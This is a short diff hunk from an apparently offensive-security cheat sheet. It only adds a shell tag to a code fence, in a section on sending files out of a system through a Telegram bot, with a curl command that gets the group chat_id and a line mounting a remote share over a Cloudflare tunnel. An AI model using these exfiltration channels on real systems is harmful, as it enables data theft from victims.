@@ -903,7 +903,7 @@ net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
 ### 4.vi. File transfer to Telegram
 
 There are [zillions of upload services](#cloudexfil) but TG is a neat alternative. Get a _TG-Bot-Token_ from the [TG BotFather](https://www.siteguarding.com/en/how-to-get-telegram-bot-api-token). Then create a new TG group and add your bot to the group. Retrieve the _chat_id_ of that group:
-```
+```sh
 curl -s "https://api.telegram.org/bot<TG-BOT-TOKEN>/getUpdates" | jq -r '.result[].message.chat.id' | uniq
 ```
 
